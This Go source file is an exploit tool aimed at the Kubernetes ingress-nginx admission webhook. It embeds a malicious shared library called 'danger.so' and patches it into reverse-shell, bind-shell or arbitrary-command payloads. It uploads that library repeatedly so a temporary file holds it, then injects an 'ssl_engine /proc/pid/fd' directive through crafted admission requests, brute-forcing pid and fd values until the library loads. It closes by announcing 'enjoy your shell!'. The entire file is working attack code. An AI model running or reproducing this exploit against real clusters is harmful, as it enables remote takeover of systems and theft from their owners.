package nginx_ingress

import (
	"bytes"
	"embed"
	_ "embed"
	"errors"
	"fmt"
	"github.com/guonaihong/gout"
	log "github.com/sirupsen/logrus"
	v1 "k8s.io/api/admission/v1"
	"strings"
	"sync"
	"time"
)

func bytesReplace(s, old, new []byte, n int) []byte {
	if len(old) != len(new) {
		panic("bytes: unequal old and new byte slices! patched failed")
	}
	return bytes.Replace(s, old, new, n)
}

var Verbose bool = false

//go:embed danger.so
var evilLibraryFS embed.FS

var evilLibrary []byte

func Init() {
	evilLibrary, _ = evilLibraryFS.ReadFile("danger.so")
	log.Tracef("Load evil so library. size: %v bytes, prefix: %v(%X)", len(evilLibrary), evilLibrary[:32], evilLibrary[:32])
}

type Payload []byte

const (
	MODE_CHECK_FLAG = "MODE_CHECK_FLAG"
	MODE_REVERSE_SH = "MODE_REVERSE_SH"
	MODE_BINDING_SH = "MODE_BINDING_SH"
	MODE_CMD_EXECVE = "MODE_CMD_EXECVE"
)

func NewReverseShellPayload(tip string, port string) Payload {
	var ip []string
	for _, part := range strings.Split(tip, ".") {
		if len(part) == 1 {
			part = "00" + part
		} else if len(part) == 2 {
			part = "0" + part
		}
		ip = append(ip, part)
	}
	payload := bytesReplace(evilLibrary, []byte("127.000.000.001"), []byte(strings.Join(ip, ".")), 1)
	switch len(port) {
	case 1:
		port = "0000" + port
	case 2:
		port = "000" + port
	case 3:
		port = "00" + port
	case 4:
		port = "0" + port
	default:
		port = port
	}
	payload = bytesReplace(payload, []byte("13337"), []byte(port), 1)
	payload = bytesReplace(payload, []byte(MODE_CHECK_FLAG), []byte(MODE_REVERSE_SH), 1)
	return payload
}

func NewBindShellPayload(port string) Payload {
	switch len(port) {
	case 1:
		port = "0000" + port
	case 2:
		port = "000" + port
	case 3:
		port = "00" + port
	case 4:
		port = "0" + port
	default:
		port = port
	}
	payload := bytesReplace(evilLibrary, []byte("31337"), []byte(port), 1)
	payload = bytesReplace(payload, []byte(MODE_CHECK_FLAG), []byte(MODE_BINDING_SH), 1)
	return payload
}

func NewCommandPayload(command string) Payload {
	if len(command) > 510 {
		return nil
	}
	cmd := []byte(command + " #")
	cmd = append(cmd, bytes.Repeat([]byte{0x41}, 512-len(cmd))...)
	payload := bytesReplace(evilLibrary, []byte("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"),
		[]byte(cmd), 1)
	payload = bytesReplace(payload, []byte(MODE_CHECK_FLAG), []byte(MODE_CMD_EXECVE), 1)
	return payload
}

func Uploader(URL string, payload Payload) error {
	return gout.POST(URL).Debug(Verbose).SetBody([]byte(payload)).
		SetHeader(gout.H{
			"Content-Type":   "application/octet-stream",
			"Content-Length": 1024 * 2024 * 10,
		}).Do()
}

func UploadThread(URL string, payload Payload, stop chan struct{}) {
	for {
		select {
		case <-stop:
			return
		default:
			err := Uploader(URL, payload)
			log.Tracef("Upload err is %v", err)
		}
	}
}

//go:embed validate.json
var validateJson string

func ValidateWebHook(URL string, fd, pid int) error {
	var resp v1.AdmissionReview
	evilUrl := fmt.Sprintf(`http://example.com/#;}}}\n\nssl_engine /proc/%v/fd/%v;\n\n`, pid, fd)
	log.Debugf("trying pid %v, fd %v", pid, fd)
	err := gout.POST(URL).Debug(Verbose).
		SetBody(strings.Replace(validateJson, "foobar", evilUrl, 1)).
		BindJSON(&resp).Do()
	if err != nil {
		return err
	}
	if resp.Response != nil && resp.Response.Result != nil {
		log.Infof("WebHook Validation Result: %v", resp.Response.Result.Message)
		if strings.Contains(resp.Response.Result.Message, "undefined symbol") {
			return nil // found and exploited
		}
	}
	return errors.New("response success, but exploit unknown failed")
}

func Exploit(WebHookUrl string, UploadUrl string, p Payload) {
	var stopUpload = make(chan struct{})

	go UploadThread(UploadUrl, p, stopUpload)
	time.Sleep(1 * time.Millisecond) // let Upload Thread Run!

	var wg sync.WaitGroup
	successFlag := false
	for pid := 10; pid < 30; pid++ {
		for fd := 10; fd < 40; fd++ {
			wg.Add(1)
			go func(pid, fd int) {
				defer wg.Done()
				err := ValidateWebHook(WebHookUrl, fd, pid)
				if err == nil {
					log.Infof("Exploit Success! pid: %d, fd: %d", pid, fd)
					successFlag = true
					stopUpload <- struct{}{}
					defer close(stopUpload)
				}
			}(pid, fd)
		}
	}
	wg.Wait()
	if !successFlag {
		log.Errorf("Exploit run complete, but looks failed!")
	} else {
		log.Infof("Exploit run complete and success, enjoy your shell!")
	}
	return
}
